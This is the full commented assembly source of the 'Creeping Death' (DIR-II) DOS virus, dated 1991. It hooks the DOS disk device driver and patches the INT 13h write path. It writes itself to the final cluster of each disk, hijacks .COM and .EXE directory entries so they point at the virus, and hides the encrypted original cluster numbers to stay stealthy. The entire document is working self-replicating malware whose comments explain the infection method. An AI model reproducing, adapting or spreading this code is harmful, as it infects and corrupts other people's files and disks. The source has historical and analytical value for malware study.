;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

dir_2   segment byte public
        assume  cs:dir_2, ds:dir_2

        org   100h

start:
         mov   sp,600h                          ; Set up the stack pointer
         inc   word ptr counter                 ; Generation counter
         xor   cx,cx
         mov   ds,cx                            ; DS points to interrupt table
         lds   ax, ds:[0c1h]                    ; Find interrupt 30h
         add   ax,21h                           ; Change it to Int 21h
         push  ds                               ; Save it on stack for use by
         push  ax                               ; subroutine "jump"
         mov   ah,30h                           ; Get DOS version
         call  jump
         cmp   al,4                             ; DOS 4.X+ : SI = 0
         sbb   si,si                            ; DOS 2/3  : SI = -1
         mov   byte ptr [drive+2],byte ptr -1   ; Initialise last drive to
                                                ; "never accessed"
         mov   bx,60h                           ; Adjust memory in ES to
         mov   ah,4ah                           ; BX paragraphs.
         call  jump

         mov   ah,52h                           ; Get DOS List of Lists
         call  jump                             ; to ES:BX
         push  es:[bx-2]                        ; Save Segment of first MCB
         lds   bx,es:[bx]                       ; DS:BX -> 1st DPB
                                                ;  (Drive parameter block)
search:  mov   ax,[bx+si+15h]                   ; Get segment of device driver
         cmp   ax,70h                           ; Is it CONFIG? (I think)
         jne   next                             ; If not, try again
         xchg  ax,cx                            ; Move driver segment to CX
         mov   [bx+si+18h],byte ptr -1          ; Flag block must be rebuilt
         mov   di,[bx+si+13h]                   ; Save offset of device driver
                                                ; Original device driver
                                                ; address in CX:DI
         mov   [bx+si+13h],offset header        ; Replace with our own
         mov   [bx+si+15h],cs                   ;  (header)
next:    lds   bx,[bx+si+19h]                   ; Get next device block
         cmp   bx,-1                            ; Is it the last one?
         jne   search                           ; If not, search it
         jcxz  install

         pop   ds                               ; Restore segment of first
         mov   ax,ds                            ; MCB
         add   ax,ds:[3]                        ; Go to next MCB
         inc   ax                               ; AX = segment next MCB
         mov   dx,cs                            ; DX = MCB owning current
         dec   dx                               ;      program
         cmp   ax,dx                            ; Are these the same?
         jne   no_boot                          ; If not, we are not currently
                                                ; in the middle of a reboot
         add   word ptr ds:[3],61h              ; Increase length owned by
                                                ; MCB by 1552 bytes
no_boot: mov   ds,dx                            ; DS = MCB owning current
                                                ; program
         mov   word ptr ds:[1],8                ; Set owner = DOS

         mov   ds,cx                            ; DS = segment of original
                                                ;      device driver
         les   ax,[di+6]                        ; ES = offset int handler
                                                ; AX = offset strategy entry
         mov   word ptr cs:str_block,ax         ; Save entry point
         mov   word ptr cs:int_block,es         ; And int block for use in
                                                ; function _in
         cld                                    ; Scan for the write
         mov   si,1                             ; function in the
scan:    dec   si                               ; original device driver
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah                          ; Wicked un-yar place o'
         cmp   [si+4],ax                        ; doom.
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1               ; Save address of patch
         stosw                                  ; area so it can be changed
         xchg  ax,si                            ; later.
         mov   di,offset i13org                 ; This is in the stack, but
         cli                                    ; it is used by "i13pr"
         movsw
         movsw

         mov   dx,0c000h                        ; Scan for hard disk ROM
                                                ; Start search @ segment C000h
fdsk1:   mov   ds,dx                            ; Load up the segment
         xor   si,si                            ; atart at offset 0000h
         lodsw                                  ; Scan for the signature
         cmp   ax,0aa55h                        ; Is it the signature?
         jne   fdsk4                            ; If not, change segment
         cbw                                    ; clear AH
         lodsb                                  ; load a byte to AL
         mov   cl,9
         sal   ax,cl                            ; Shift left, 0 filled
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   word ptr [si+2],4ch
         jne   fdsk3
         push  dx                               ; Save the segment
         push  [si+4]                           ; and offset on stack
         jmp   short death                      ; for use by i13pr

install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si                               ; Increment search offset
         cmp   si,ax                            ; If we are not too high,
         jb    fdsk2                            ; try again
fdsk4:   inc   dx                               ; Increment search segment
         cmp   dh,0f0h                          ; If we are not in high
         jb    fdsk1                            ; memory, try again

         sub   sp,4                             ; effectively push dummy vars.
death:   push  cs                               ; on stack for use by i13pr
         pop   ds
         mov   bx,ds:[2ch]                      ; Get environment from PSP
         mov   es,bx
         mov   ah,49h                           ; Release it (to save memory)
         call  jump
         xor   ax,ax
         test  bx,bx                            ; Is BX = 0?
         jz    boot                             ; If so, we are booting now
         mov   di,1                             ; and not running a file
seek:    dec   di                               ; Search for end of
         scasw                                  ; the environment block
         jne   seek
         lea   si,[di+2]                        ; SI points to filename
         jmp   short exec                       ; (in DOS 3.X+)
                                                ; Execute that file
boot:    mov   es,ds:[16h]                      ; get PSP of parent
         mov   bx,es:[16h]                      ; get PSP of parent
         dec   bx                               ; go to its MCB
         xor   si,si
exec:    push  bx
         mov   bx,offset param                  ; Set up parameter block
                                                ; for EXEC function
         mov   [bx+4],cs                        ; segment to command line
         mov   [bx+8],cs                        ; segment to 1st FCB
         mov   [bx+12],cs                       ; segment to 2nd FCB
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di                               ; Save filename offset
         mov   cx,40                            ; Copy the filename to
         rep   movsw                            ; the buffer
         push  cs
         pop   ds

         mov   ah,3dh                           ; Handle open file
         mov   dx,offset file                   ; "c:ÿ",0
         call  jump
         pop   dx                               ; DS:DX -> filename

         mov   ax,4b00h                         ; Load and Execute
         call  jump                             ; ES:BX = param block
         mov   ah,4dh                           ; Get errorlevel
         call  jump
         mov   ah,4ch                           ; Terminate

jump:    pushf                                  ; Simulate an interrupt 21h
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3                             ; Write AL sectors from ES:BX
         jmp   dword ptr cs:[i13org]            ; to track CH, sector CL,
                                                ; head DH, drive DL


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es                               ; Move segment of parameter
         pop   ds                               ; block to DS
         mov   al,[bx+2]                        ; [bx+2] holds command code

         cmp   al,4                             ; Input (read)
         je    input
         cmp   al,8                             ; Output (write)
         je    output
         cmp   al,9                             ; Output (write) with verify
         je    output

         call  in_                              ; Call original device
         cmp   al,2                             ; Request build BPB
         jne   ppp                              ; If none of the above, exit
         lds   si,[bx+12h]                      ; DS:SI point to BPB table
         mov   di,offset bpb_buf                ; Replace old pointer with
         mov   es:[bx+12h],di                   ; a pointer to our own
         mov   es:[bx+14h],cs                   ; BPB table
         push  es                               ; Save segment of parameters
         push  cs
         pop   es
         mov   cx,16                            ; Copy the old BPB table to
         rep   movsw                            ; our own
         pop   es                               ; Restore parameter segment
         push  cs
         pop   ds
         mov   al,[di+2-32]                     ; AL = sectors per allocation
         cmp   al,2                             ;      unit.  If less than
         adc   al,0                             ;      2, increment
         cbw                                    ; Extend sign to AH (clear AH)
         cmp   word ptr [di+8-32],0             ; Is total number sectors = 0?
         je    m32                              ; If so, big partition (>32MB)
         sub   [di+8-32],ax                     ; Decrease space of disk by
                                                ; one allocation unit(cluster)
         jmp   short ppp                        ; Exit
m32:     sub   [di+15h-32],ax                   ; Handle large partitions
         sbb   word ptr [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf                                   ; We are outta here!

output:  mov   cx,0ff09h
         call  check                            ; is it a new disk?
         jz    inf_sec                          ; If not, go away
         call  in_                              ; Call original device handler
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16                            ; Restore the stack
         jmp   short ppp                        ; Leave device driver

input:   call  check                            ; Is it a new disk?
         jz    read                             ; If not, leave
inf_dsk: mov   byte ptr [bx+2],4                ; Set command code to READ
         cld
         lea   si,[bx+0eh]                      ; Load from buffer address
         mov   cx,8                             ; Save device driver request
save:    lodsw                                  ; on the stack
         push  ax
         loop  save
         mov   word ptr [bx+14h],1              ; Starting sector number = 1
                                                ; (Read 1st FAT)
         call  driver                           ; Read one sector
         jnz   read_                            ; If error, exit
         mov   byte ptr [bx+2],2                ; Otherwise build BPB
         call  in_                              ; Have original driver do the
                                                ; work
         lds   si,[bx+12h]                      ; DS:SI points to BPB table
         mov   ax,[si+6]                        ; Number root directory entries
         add   ax,15                            ; Round up
         mov   cl,4
         shr   ax,cl                            ; Divide by 16 to find sectors
                                                ; of root directory
         mov   di,[si+0bh]                      ; DI = sectors/FAT
         add   di,di                            ; Double for 2 FATs
         stc                                    ; Add one for boot record
         adc   di,ax                            ; Add sector size of root dir
         push  di                               ; to find starting sector of
                                                ; data (and read)
         cwd                                    ; Clear DX
         mov   ax,[si+8]                        ; AX = total sectors
         test  ax,ax                            ; If it is zero, then we have
         jnz   more                             ; an extended partition(>32MB)
         mov   ax,[si+15h]                      ; Load DX:AX with total number
         mov   dx,[si+17h]                      ; of sectors
more:    xor   cx,cx
         sub   ax,di                            ; Calculate FAT entry for last
                                                ; sector of disk
         sbb   dx,cx
         mov   cl,[si+2]                        ; CL = sectors/cluster
         div   cx                               ; AX = cluster #
         cmp   cl,2                             ; If there is more than 1
         sbb   ax,-1                            ; cluster/sector, add one
         push  ax                               ; Save cluster number
         call  convert                          ; AX = sector number to read
                                                ; DX = offset in sector AX
                                                ;      of FAT entry
                                                ; DI = mask for EOF marker
         mov   byte ptr es:[bx+2],4             ; INPUT (read)
         mov   es:[bx+14h],ax                   ; Starting sector = AX
         call  driver                           ; One sector only
again:   lds   si,es:[bx+0eh]                   ; DS:SI = buffer address
         add   si,dx                            ; Go to FAT entry
         sub   dh,cl                            ; Calculate a new encryption
         adc   dx,ax                            ; value
         mov   word ptr cs:gad+1,dx             ; Change the encryption value
         cmp   cl,1                             ; If there is 0 cluster/sector
         je    small_                           ; then jump to "small_"
         mov   ax,[si]                          ; Load AX with offset of FAT
                                                ; entry
         and   ax,di                            ; Mask it with value from
                                                ; "convert" then test to see
                                                ; if the sector is fine
         cmp   ax,0fff7h                        ; 16 bit reserved/bad
         je    bad
         cmp   ax,0ff7h                         ; 12 bit reserved/bad
         je    bad
         cmp   ax,0ff70h                        ; 12 bit reserved/bad
         jne   ok
bad:     pop   ax                               ; Tried to replicate on a bad
         dec   ax                               ; cluster.  Try again on a
         push  ax                               ; lower one.
         call  convert                          ; Find where it is in the FAT
         jmp   short again                      ; and try once more
small_:  not   di                               ; Reverse mask bits
         and   [si],di                          ; Clear other bits
         pop   ax                               ; AX = cluster number
         push  ax
         inc   ax                               ; Need to do 2 consecutive
         push  ax                               ; bytes
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx                               ; Multiply by 16
         mul   dx
here:    or    [si],ax                          ; Set cluster to next
         pop   ax                               ; Restore cluster of write
         call  convert                          ; Calculate buffer offset
         mov   si,es:[bx+0eh]                   ; Go to FAT entry (in buffer)
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di                            ; DI = mask from "convert"
         dec   dx
         and   dx,di                            ; Yerg!
         not   di
         and   [si],di
         or    [si],dx                          ; Set [si] to DI

         cmp   ax,dx                            ; Did we change the FAT?
         pop   ax                               ; i.e. Are we already on this
         pop   di                               ; disk?
         mov   word ptr cs:pointer+1,ax         ; Our own starting cluster
         je    _read_                           ; If we didn't infect, then
                                                ; leave the routine.  Oh
                                                ; welp-o.
         mov   dx,[si]
         push  ds
         push  si
         call  write                            ; Update the FAT
         pop   si
         pop   ds
         jnz   _read_                           ; Quit if there's an error
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx                               ; Multiply by sectors/cluster
                                                ; to find the sector of the
                                                ; write
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   word ptr [bx+12h],2              ; Byte/sector count
         mov   [bx+14h],ax                      ; Starting sector #
         test  dx,dx
         jz    less
         mov   word ptr [bx+14h],-1             ; Flag extended partition
         mov   [bx+1ah],ax                      ; Handle the sector of the
         mov   [bx+1ch],dx                      ; extended partition
less:    mov   [bx+10h],cs                      ; Transfer address segment
         mov   [bx+0eh],100h                    ; and the offset (duh)
         call  write                            ; Zopy ourselves!
                                                ; (We want to travel)
_read_:  std
         lea   di,[bx+1ch]                      ; Restore device driver header
         mov   cx,8                             ; from the stack
load:    pop   ax
         stosw
         loop  load
_read:   call  in_                              ; Call original device handler

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]                   ; Bytes/Sector
         lds   si,es:[bx+0eh]                   ; DS:SI = pointer to buffer
         sal   di,cl                            ; Multiply by 512
                                                ; DI = byte count
         xor   cl,cl
         add   di,si                            ; Go to address in the buffer
         xor   dl,dl                            ; Flag for an infection in
                                                ; function find
         push  ds
         push  si
         call  find                             ; Infect the directory
         jcxz  no_inf
         call  write                            ; Write it back to the disk
         and   es:[bx+4],byte ptr 07fh          ; Clear error bit in status
                                                ; word
no_inf:  pop   si
         pop   ds
         inc   dx                               ; Flag for a decryption in
                                                ; function find
         call  find                             ; Return right information to
                                                ; calling program
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]                        ; Check filename extension
         cmp   ax,"XE"                          ; in directory structure
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on
found:   test  [si+1eh],0ffc0h ; >4MB           ; Check file size high word
         jnz   go_on                            ; to see if it is too big
         test  [si+1dh],03ff8h ; <2048B         ; Check file size low word
         jz    go_on                            ; to see if it is too small
         test  [si+0bh],byte ptr 1ch            ; Check attribute for subdir,
         jnz   go_on                            ; volume label or system file
         test  dl,dl                            ; If none of these, check DX
         jnz   rest                             ; If not 0, decrypt
pointer: mov   ax,1234h                         ; mov ax, XX modified elsewhere
         cmp   ax,[si+1ah]                      ; Check for same starting
                                                ; cluster number as us
         je    go_on                            ; If it is, then try another
         xchg  ax,[si+1ah]                      ; Otherwise make it point to
                                                ; us.
gad:     xor   ax,1234h                         ; Encrypt their starting
                                                ; cluster
         mov   [si+14h],ax                      ; And put it in area reserved
                                                ; by DOS for no purpose
         loop  go_on                            ; Try another file
rest:    xor   ax,ax                            ; Disinfect the file
         xchg  ax,[si+14h]                      ; Get starting cluster
         xor   ax,word ptr cs:gad+1             ; Decrypt the starting cluster
         mov   [si+1ah],ax                      ; and put it back
go_on:   db    2eh,0d1h,6                       ; rol cs:[gad+1], 1
         dw    offset gad+1                     ; Change encryption and
         add   si,32                            ; go to next file
         cmp   di,si                            ; If it is not past the end of
         jne   find                             ; the buffer, then try again
         ret                                    ; Otherwise quit

check:   mov   ah,[bx+1]                        ; ah = unit code (block device
                                                ;                 only)
drive:   cmp   ah,-1                            ; cmp ah, XX can change.
                                                ; Compare with the last call
                                                ; -1 is just a dummy
                                                ; impossible value that will
                                                ; force the change to be true
         mov   byte ptr cs:[drive+2],ah         ; Save this call's drive
         jne   changed                          ; If not the same as last call
                                                ; media has changed
         push  [bx+0eh]                         ; If it is the same physical
                                                ; drive, see if floppy has
                                                ; been changed
         mov   byte ptr [bx+2],1                ; Tell original driver to do a
         call  in_                              ; media check (block only)
         cmp   byte ptr [bx+0eh],1              ; Returns 1 in [bx+0eh] if
         pop   [bx+0eh]                         ; media has not been changed
         mov   [bx+2],al                        ; Restore command code
changed: ret                                    ; CF,ZF set if media has not
                                                ; been changed, not set if
                                                ; has been changed or we don't
                                                ; know
write:   cmp   byte ptr es:[bx+2],8             ; If we want OUTPUT, go to
         jae   in_                              ; original device handler
                                                ; and return to caller
         mov   byte ptr es:[bx+2],4             ; Otherwise, request INPUT
         mov   si,70h
         mov   ds,si                            ; DS = our segment
modify:  mov   si,1234h                         ; Address is changed elsewhere
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in_                              ; Call original device handler
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   word ptr es:[bx+12h],1           ; One sector
in_:                                            ; in_ first calls the strategy
                                                ; of the original device
                                                ; driver and then calls the
                                                ; interrupt handler
         db    09ah                             ; CALL FAR PTR
str_block:
         dw    ?,70h                            ; address
         db    09ah                             ; CALL FAR PTR
int_block:
         dw    ?,70h                            ; address
         test  es:[bx+4],byte ptr 80h           ; Was there an error?
         ret

convert: cmp   ax,0ff0h                         ; 0FFF0h if 12 bit FAT
         jae   fat_16                           ; 0FF0h = reserved cluster
         mov   si,3                             ; 12 bit FAT
         xor   word ptr cs:[si+gad-1],si        ; Change the encryption value
         mul   si                               ; Multiply by 3 and
         shr   ax,1                             ; divide by 2
         mov   di,0fffh                         ; Mark it EOF (low 12 bits)
         jnc   cont                             ; if it is even, continue
         mov   di,0fff0h                        ; otherwise, mark it EOF (high
         jmp   short cont                       ; 12 bits) and then continue
fat_16:  mov   si,2                             ; 16 bit FAT
         mul   si                               ; Double cluster #
         mov   di,0ffffh                        ; Mark it as end of file
cont:    mov   si,512
         div   si                               ; AX = sector number
                                                ; (relative to start of FAT)
                                                ; DX = offset in sector AX
header:  inc   ax                               ; Increment AX to account for
         ret                                    ; boot record

counter: dw    0

         dw    842h                             ; Attribute
                                                ;  Block device
                                                ;  DOS 3 OPEN/CLOSE removable
                                                ;        media calls supported
                                                ;  Generic IOCTL call supported
                                                ; Supports 32 bit sectors
         dw    offset main                      ; Strategy routine
         dw    offset rts                       ; Interrupt routine (rtf)
         db    7fh                              ; Number of subunits supported
                                                ; by this driver.  Wow, lookit
                                                ; it -- it's so large and juicy

; Parameter block format:
; 0  WORD Segment of environment
; 2 DWORD pointer to command line
; 6 DWORD pointer to 1st default FCB
;10 DWORD pointer to 2nd default FCB
param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.
dir_2   ends
        end     start

